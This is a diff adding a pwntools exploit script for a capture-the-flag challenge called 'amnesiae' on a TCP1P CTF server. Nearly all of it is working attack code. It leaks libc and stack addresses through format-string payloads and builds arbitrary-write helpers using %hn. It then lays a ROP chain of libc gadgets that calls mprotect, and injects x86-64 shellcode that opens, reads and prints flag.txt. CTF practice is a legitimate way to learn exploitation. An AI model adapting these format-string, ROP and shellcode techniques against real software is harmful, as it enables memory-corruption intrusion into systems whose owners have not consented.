@@ -1,0 +1,186 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./amnesiae")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux.so")
+# context.log_level='debug'
+i = 0
+while True:
+    try:
+        print(f"trying {i}")
+        p = remote("ctf.tcp1p.team", 20037)
+        i+=1
+        # p = remote("127.0.0.1", 20037)
+        # p = process([exe.path])
+        def gdbs():
+            context.terminal = ["foot"]
+            gdb.attach(p, gdbscript="""
+
+                       """)
+            # p = gdb.debug([exe.path],"""
+            #
+            #                 """)
+            return p
+
+        sla = lambda msg, data: p.sendlineafter(msg, data)
+        sa = lambda msg, data: p.sendafter(msg, data)
+        sl = lambda data: p.sendline(data)
+        s = lambda data: p.send(data)
+        offs = 43
+        # wtw = 0xe4d8
+        # offs2 = 83
+        # win = 0x8010
+        # payload = b""
+        # payload+=b"%c"*(offs-2)+f"%{int(wtw-offs+2)}c%hn".encode()
+        # payload+=b"%c"*(offs2-offs-2)+f"%{int(win-offs-offs2+2+7038)}c%hn".encode()
+        # log.info(f"payload's len: {len(payload)}")
+        # sla("?",payload)
+        sla("?","|%lu"*(53-6))
+        p.recvuntil("------")
+        thing = p.recvuntil("Are you sure ",drop=True).decode().split("|")
+        log.info(f"debug thing: {thing}")
+        libc_leak = int(thing[len(thing)-1])
+        log.info(f"libc: {hex(libc_leak)}")
+        libc.address = libc_leak-0x29d90
+        log.info(f"base_libc: {hex(libc.address)}")
+        stack = int(thing[len(thing)-7-1])
+        base = int(thing[len(thing)-6-1])-0x16f7
+        target = base + 16400
+        rbp = stack-48
+
+        log.info(f"base: {hex(base)}")
+        log.info(f"stack: {hex(stack)}")
+        payload = b"a"*24+p64(target)
+        # wtw = target&0xffff
+        # offs = 43
+        # # payload = b"%c"*(offs-2) + f"%{int(wtw-offs+2)}c%hn".encode()
+        # payload = "a"*0x100
+        # # log.info(f"payload's len: {len(payload)}")
+        sla("ink again... what do you remember?",payload)
+        payload = b"%c"*10+b"%n"
+        sla("ink again... what do you remember?",payload)
+        target = (stack-40)
+        def write1(addr,value):
+            addr = addr & 0xffffffffffffffff
+            offs = 51
+            wtw = (addr)& 0xffff
+            payload = f"%{wtw}c%{offs}$hn"
+            sla("ink again... what do you remember?",payload)
+            offs = 81
+            wtw = value&0xffff
+            payload = f"%{wtw}c%{offs}$hn"
+            sla("ink again... what do you remember?",payload)
+        def writes(addr,value):
+            value = value & 0xffffffffffffffff
+            addr = addr & 0xffffffffffffffff
+            pack = {
+                    addr&0xffff:value&0xffff,
+                    (addr+2)&0xffff:(value>>16)&0xffff,
+                    (addr+4)&0xffff:(value>>32)&0xffff,
+                    }
+            for i in range(len(pack)):
+                offs = 51
+                wtw = (addr+i*2)& 0xffff
+                payload = f"%{wtw}c%{offs}$hn"
+                sla("ink again... what do you remember?",payload)
+                offs = 81
+                wtw = pack[wtw]
+                payload = f"%{wtw}c%{offs}$hn"
+                sla("ink again... what do you remember?",payload)
+        leave_ret = libc.address + 0x000000000004da83
+        pop_rdi = libc.address + 0x000000000002a3e5
+        pop_rsi = libc.address + 0x000000000002be51
+        pop_rdx = libc.address + 0x00000000000904a9 #0x000000000011f2e7 : pop rdx ; pop r12 ; ret
+        pop_rax = libc.address + 0x0000000000045eb0
+        syscall = libc.address + 1132677
+        gadget = stack +1056
+        rw_section = base + 0x4000
+        log.info(f"gadget: {hex(gadget)}")
+        call_rax = libc.address + 0x0000000000029d8e
+        pop_rax = libc.address + 0x0000000000045eb0
+        replace_rbp = base+28696
+        path = base+0x5500
+        writes(rbp,gadget-8)
+        writes(target,leave_ret)
+        writes(gadget, pop_rax)
+        write1(gadget+0x8,0xa)
+        writes(gadget+0x10,pop_rdi)
+        writes(gadget+0x18,rw_section)
+        writes(gadget+0x20,pop_rsi)
+        write1(gadget+0x28,0x5000)
+        writes(gadget+0x30,pop_rdx)
+        write1(gadget+0x38,7)
+        write1(gadget+0x40,7)
+        writes(gadget+0x48,syscall)
+        writes(gadget+0x50,pop_rax)
+        #skip
+        writes(gadget+0x60,pop_rdi)
+        #skip
+        writes(gadget+0x70,pop_rsi)
+        writes(gadget+0x78,rw_section+0x500)
+        writes(gadget+0x80,pop_rdx)
+        write1(gadget+0x88,0x2000)
+        write1(gadget+0x90,0x2000)
+        writes(gadget+0x98,syscall)
+        writes(gadget+0xa0,rw_section+0x500)
+
+        # gdbs()
+        sla("?","I remember everything!")
+        format_string = libc.address + 0x1d86b7
+        shellcode = asm(f"""
+                        mov rax, 0x2
+                        mov rdi,{path+0x500}
+                        mov rsi,0
+                        xor rdx,rdx
+                        syscall
+                            
+                        mov rdi,rax
+                        mov rax, 0
+                        mov rsi,{path+0x500}
+                        mov rdx, 0x500
+                        syscall
+                        mov byte ptr[rsi+rax-1],0x0a
+                        
+                        mov rdi,{path+0x500}
+                        mov rsi,{path+0x500}
+                        mov rbp, {base+0x5000+8+0x500}
+                        leave
+                        ret
+                        
+
+                        """,arch="amd64")
+        shellcode = asm(f"""
+                        mov rax, 0x2
+                        mov rdi,{path+0x500}
+                        mov rsi,0
+                        xor rdx,rdx
+                        syscall
+                        mov rdi,rax
+                        mov rax, 0
+                        mov rsi,{path+0x501}
+                        mov rdx, 0x500
+                        syscall
+                        mov rax,1
+                        mov rdi,1
+                        mov rsi,{path+0x501}
+                        mov rdx,0x100
+                        syscall
+                        
+
+                        """,arch="amd64")
+        # input("input flag path->")
+        sl(shellcode.ljust(0x1000,b"\0")+(p64(0)+p64(base+0x5000)+p64(libc.sym.puts)).ljust(0x500,b"\0")+b"flag.txt\0")
+        # sl(shellcode.ljust(0x1000,b"\0")+(p64(0)+p64(base+0x5000)+p64(libc.sym.fprintf)).ljust(0x500,b"\0")+b"/home/amnesia/flag.txt\0")
+        # sl(shellcode.ljust(0x1500,b"\0")+b"/home/amnesia/flag.txt\0")
+        try:
+            p.recvuntil("TCP1P{")
+            break
+        except:
+            pass
+    except:
+        pass
+p.interactive()
+# good luck pwning :)
+
